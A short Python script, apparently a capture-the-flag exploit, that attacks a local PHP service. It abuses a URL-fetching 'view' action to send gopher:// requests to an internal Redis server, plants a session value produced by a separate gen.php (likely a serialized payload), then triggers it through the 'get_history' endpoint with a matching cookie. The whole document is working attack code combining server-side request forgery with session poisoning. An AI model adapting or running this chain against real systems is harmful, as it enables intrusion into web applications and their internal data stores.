import requests
from subprocess import check_output
import json
from urllib.parse import quote

url = "http://localhost:8763/api.php"

sess_id = "pekomiko"
s = json.dumps(check_output(["php", "gen.php"]).decode())
redis_cmd = f"""
set {sess_id} {s}
get {sess_id}
quit
"""
r = requests.get(
    url,
    params={"action": "view", "url": f"gopher://redis:6379/_{quote(redis_cmd)}"},
)
print(r.text)
r = requests.get(
    url,
    params={"action": "get_history"},
    cookies={"sess_id": sess_id},
)
print(r.text)
